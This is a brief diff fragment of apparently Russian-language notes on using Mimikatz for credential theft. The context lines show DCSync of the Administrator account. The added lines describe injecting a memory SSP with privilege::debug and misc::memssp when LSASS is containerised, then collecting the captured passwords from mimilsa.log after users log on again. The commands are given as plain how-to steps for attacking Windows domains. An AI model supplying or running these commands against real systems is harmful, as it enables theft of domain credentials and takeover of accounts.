@@ -44,3 +44,14 @@ mimikatz # lsadump::synchronize /system:C:\Windows\system32\config\system /ntds:
 mimikatz # lsadump::dcsync /user:Administrator
 ```
 где "Administrator" - это имя пользователя, данные которого вы хотите получить.
+
+
+Если LSASS в виртуальном контейнере
+
+privilege::debug
+misc::memssp
+
+и получаем после перелогина
+
+c:\windows\system32\mimilsa.log
+
